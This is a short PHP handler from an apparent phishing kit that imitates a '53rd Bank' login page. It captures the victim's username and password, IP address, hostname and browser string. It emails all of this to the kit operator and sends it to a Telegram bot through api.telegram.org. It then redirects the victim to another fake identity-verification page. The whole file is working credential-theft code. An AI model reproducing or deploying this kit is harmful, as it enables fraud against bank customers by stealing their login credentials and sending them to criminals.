<?php 



	ob_start();
session_start();
	include '../conf.php';
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
	if ( isset( $_POST['username'] ) ) {
		
		$_SESSION['username'] 	  = $_POST['username'];
		$_SESSION['password'] 	  = $_POST['password'];
		$msg = <<<EOT
-53rd Bank Login-
[USERNAME] 		: {$_SESSION['username']}
[PASSWORD]		: {$_SESSION['password']}

	- IP - Info -
IP		: $ip
IP lookup		: https://ip-api.com/$ip
OS		: $useragent

 - end - 
\r\n\r\n
EOT;

		$subject = " 53RD User Info  From $ip";
        $headers = "From: Gohard2 <5rd3@gohard2.com>\r\n";
        $headers .= "MIME-Version: 1.0\r\n";
        $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
		@mail($mailto,$subject,$msg,$headers);
		
		$data = [
			'chat_id' => $chatid,
			'text' => $msg
		];
		$response = file_get_contents("https://api.telegram.org/bot$apitoken/sendMessage?" . http_build_query($data) );



        header("Location: ../c19.php?oamo/identity/_YOUR_INFORMATION_PAGE&token=cjmvJprW2Dw1/recognizeUser/mfaidentification");
        exit();
	} else {
		header("Location: ../index.php?");
		exit();
	}
?>